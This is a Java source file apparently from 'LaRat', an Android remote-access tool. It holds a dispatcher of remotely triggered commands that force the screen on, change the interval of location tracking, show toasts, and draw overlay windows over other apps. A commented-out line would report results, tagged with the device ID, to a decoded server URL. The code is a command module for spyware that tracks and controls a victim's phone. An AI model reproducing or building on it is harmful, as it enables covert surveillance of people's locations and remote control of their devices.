package com.c4wd.command;

import android.content.Context;
import android.graphics.PixelFormat;
import android.os.AsyncTask;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.Toast;

import com.c4wd.larat.LaRatLocationManager;
import com.larat.drawing.BouncingBall;;
import java.util.HashMap;

/**
 * Created by cory on 10/4/15.
 */
public class Command {

    public static HashMap<String, AsyncTask> commandList;

    public static AsyncTask getTask(String id) {
        return commandList.get(id);
    }

    public static void initCommands() {
        Command.commandList = new HashMap<String, AsyncTask>();

        commandList.put("ScreenOn", new ScreenOnTask());
        commandList.put("SetLocationInterval", new SetLocationIntervalTask());
        commandList.put("Toast", new ToastTask());
        commandList.put("OpenGL", new OpenGLViewTask());
        commandList.put("Pong", new OpenGLViewTask());
    }

    public static class ScreenOnTask extends AsyncTask<Object, Void, String> {
        @Override
        protected String doInBackground(Object... ctx) {
            PowerManager pm = (PowerManager) ((CommandContext)ctx[0]).getContext().getSystemService(Context.POWER_SERVICE);
            final PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK |PowerManager.ACQUIRE_CAUSES_WAKEUP |PowerManager.ON_AFTER_RELEASE, "");
            wl.acquire();
            return "Executed";
        }
        @Override
        protected void onPostExecute(String result) {
            //getInputStreamFromUrl(Constants.getDecodedUrl()  + Constants.urlPostInfo + "UID=" + PreferenceManager.getDefaultSharedPreferences(appContext).getString("AndroidID", "") + "&Data=", "Screen On Complete");
        }
        @Override
        protected void onPreExecute() {}
        @Override
        protected void onProgressUpdate(Void... values) {}
    }

    public static class ToastTask extends AsyncTask<Object, Void, Object> {

        private CommandContext context;

        @Override
        protected Object doInBackground(Object... objects) {
            context = (CommandContext)objects[0];
            return null;
        }

        @Override
        protected void onPostExecute(Object o) {
            Toast.makeText(context.getContext(),
                    context.getArgument(0).toString(),
                    context.getArgument(1).toString().equals("LONG") ? Toast.LENGTH_LONG : Toast.LENGTH_SHORT).show();
        }
    }

    public static class SetLocationIntervalTask extends AsyncTask<Object, Void, Void>  {

        @Override
        protected Void doInBackground(Object... objects) {
            CommandContext context = (CommandContext)objects[0];
            long interval = Long.parseLong(context.getArgument(0).toString());
            LaRatLocationManager.LOCATION_REQUEST_INTERVAL = interval;
            LaRatLocationManager.startLocationService(context.getContext());
            return null;
        }
    }

    public static class OpenGLViewTask extends AsyncTask<Object, Void, Void> {

        private CommandContext context;

        @Override
        protected Void doInBackground(Object... objects) {
            this.context = (CommandContext)(objects[0]);
            return null;
        }

        @Override
        protected void onPostExecute(Void returnValue) {
            WindowManager windowManager = (WindowManager) this.context.getContext().getSystemService(Context.WINDOW_SERVICE);

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.TYPE_PHONE,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT);

            params.gravity = Gravity.FILL;
            params.x = 0;
            params.y = 0;

            /*GLSurfaceView view = new GLSurfaceView(context.getContext());
            view.setRenderer(new OpenGLRenderer());
            ViewGroup.LayoutParams layoutParams = new ViewGroup.LayoutParams(80, 80);
            view.setLayoutParams(layoutParams);*/

            /*ImageView view = new ImageView(context.getContext());
            view.setLayoutParams(new ViewGroup.LayoutParams(100, 100));
            view.setImageBitmap();*/

            BouncingBall view = new BouncingBall(context.getContext());
            view.maxX = windowManager.getDefaultDisplay().getWidth();
            view.maxY = windowManager.getDefaultDisplay().getHeight();

            windowManager.addView(view, params);
        }

    }

    public static class PongTask extends AsyncTask<Object, Void, Void> {

        private CommandContext context;

        @Override
        protected Void doInBackground(Object... objects) {
            this.context = (CommandContext)(objects[0]);
            return null;
        }

        @Override
        protected void onPostExecute(Void returnValue) {
            WindowManager windowManager = (WindowManager) this.context.getContext().getSystemService(Context.WINDOW_SERVICE);

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.TYPE_PHONE,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT);

            params.gravity = Gravity.FILL;
            params.x = 0;
            params.y = 0;

            BouncingBall view = new BouncingBall(context.getContext());
            view.maxX = windowManager.getDefaultDisplay().getWidth();
            view.maxY = windowManager.getDefaultDisplay().getHeight();

            windowManager.addView(view, params);
        }

    }
}
